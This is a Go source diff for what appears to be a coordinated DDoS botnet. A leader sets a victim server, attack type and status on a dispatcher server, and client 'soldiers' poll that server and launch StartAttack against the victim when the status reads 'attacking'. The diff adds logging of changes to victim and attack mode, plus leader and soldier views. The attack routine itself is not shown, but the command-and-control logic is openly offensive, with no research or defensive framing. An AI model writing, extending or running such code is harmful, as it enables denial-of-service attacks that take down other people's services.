@@ -5,9 +5,14 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"github.com/fatih/color"
 	"net/http"
+	"strings"
+	"sync"
 	"time"
 )
+
+var LogChan = make(chan string, 10)
 
 type Leader struct {
 	Client
@@ -45,7 +50,6 @@ func (c *Client) GetCamp() CampAPI {
 
 func (c *Client) JoinCamp() error {
 	//post request to dispatcher server /camp/
-	//with body {name: c.Name}
 	jr, err := json.Marshal(c)
 	if err != nil {
 		return err
@@ -69,16 +73,16 @@ func (c *Client) JoinCamp() error {
 	return errors.New(msg)
 }
 
-func (c *Leader) RemoveFromCamp(password string) error {
+func (l *Leader) RemoveFromCamp(password string) error {
 	//delete request to dispatcher server /camp/
 	//with body {name: c.Name}
-	rq, err := http.NewRequest("DELETE", c.DispatcherServer+"/camp", nil)
+	rq, err := http.NewRequest("DELETE", l.DispatcherServer+"/camp", nil)
 	rq.Header.Add("Authorization", password)
 
 	if err != nil {
 		return err
 	}
-	do, err := c.Do(rq)
+	do, err := l.Do(rq)
 	defer do.Body.Close()
 	if err != nil {
 		return err
@@ -93,7 +97,7 @@ func (c *Leader) RemoveFromCamp(password string) error {
 	}
 }
 
-func (c *Leader) UpdateCampSettings(settings CampSettings, password string) error {
+func (l *Leader) UpdateCampSettings(settings CampSettings) error {
 	//put request to dispatcher server /camp/
 	//convert settings to json and put it in the body
 	jr, err := json.Marshal(settings)
@@ -101,13 +105,13 @@ func (c *Leader) UpdateCampSettings(settings CampSettings, password string) erro
 		return err
 	}
 
-	rq, err := http.NewRequest("PUT", c.DispatcherServer+"/camp", bytes.NewReader(jr))
+	rq, err := http.NewRequest("PUT", l.DispatcherServer+"/camp", bytes.NewReader(jr))
 	if err != nil {
 		return err
 	}
-	rq.Header.Add("Authorization", password)
+	rq.Header.Add("Authorization", l.Password)
 
-	do, err := c.Do(rq)
+	do, err := l.Do(rq)
 	defer do.Body.Close()
 	if err != nil {
 		return err
@@ -121,25 +125,100 @@ func (c *Leader) UpdateCampSettings(settings CampSettings, password string) erro
 	}
 }
 
-func (c *Client) ListenAndDo() {
-	cmp := c.GetCamp()
-	prevStatus := cmp.Settings.Status
+func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI) {
+	prevCmp := c.GetCamp()
+	ChangedDataChan <- prevCmp
 	stopchan := make(chan bool, 1)
+	stopchan <- false
 
+	var cmp CampAPI
 	for {
 		cmp = c.GetCamp()
-		if prevStatus != cmp.Settings.Status {
-			DisplayCampInfo(cmp)
-
+		if !cmp.Equals(prevCmp) {
+			select {
+			case <-ChangedDataChan:
+			default:
+			}
+			ChangedDataChan <- cmp
+			if cmp.Settings.DDOSType != prevCmp.Settings.DDOSType {
+				LogChan <- "change attack mode " + cmp.Settings.DDOSType
+			}
 			if cmp.Settings.Status == "attacking" {
 				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan)
 			}
+			if cmp.Settings.VictimServer != prevCmp.Settings.VictimServer {
+				LogChan <- "Victim server changed to " + cmp.Settings.VictimServer
+			}
+
 			if cmp.Settings.Status == "stopped" {
-				fmt.Println("Stopping attack")
+				select {
+				case <-stopchan:
+				default:
+				}
 				stopchan <- true
 			}
-			prevStatus = cmp.Settings.Status
+			prevCmp = cmp
 			time.Sleep(2 * time.Second)
 		}
 	}
+}
+
+func (c *Client) Start() {
+	err := c.JoinCamp()
+	if err != nil {
+		//check if error contain connection refused
+		//if yes, then the dispatcher server is not running
+		if strings.Contains(err.Error(), "connection refused") {
+			color.Red("Dispatcher server is not running")
+			return
+		} else {
+			color.Red(err.Error())
+			return
+		}
+	}
+	var ChangedDataChan = make(chan CampAPI, 1)
+	wg := sync.WaitGroup{}
+	wg.Add(1)
+	go func() {
+		c.ListenAndDo(ChangedDataChan)
+		wg.Done()
+	}()
+
+	go func() {
+		StartSoldierView(ChangedDataChan)
+		wg.Done()
+	}()
+	wg.Wait()
+}
+
+func (l *Leader) ListenChangeView(changedDataChan chan CampAPI) {
+	prevCamp := l.GetCamp()
+	changedDataChan <- prevCamp
+	for {
+		camp := l.GetCamp()
+		if !camp.Equals(prevCamp) {
+			select {
+			case <-changedDataChan:
+			default:
+			}
+			changedDataChan <- camp
+		}
+		time.Sleep(1 * time.Second)
+	}
+}
+func (l *Leader) Start() {
+	var changedDataChan = make(chan CampAPI, 1)
+
+	wg := sync.WaitGroup{}
+	wg.Add(1)
+
+	go func() {
+		l.ListenChangeView(changedDataChan)
+		wg.Done()
+	}()
+	go func() {
+		l.StartLeaderView(changedDataChan)
+		wg.Done()
+	}()
+	wg.Wait()
 }
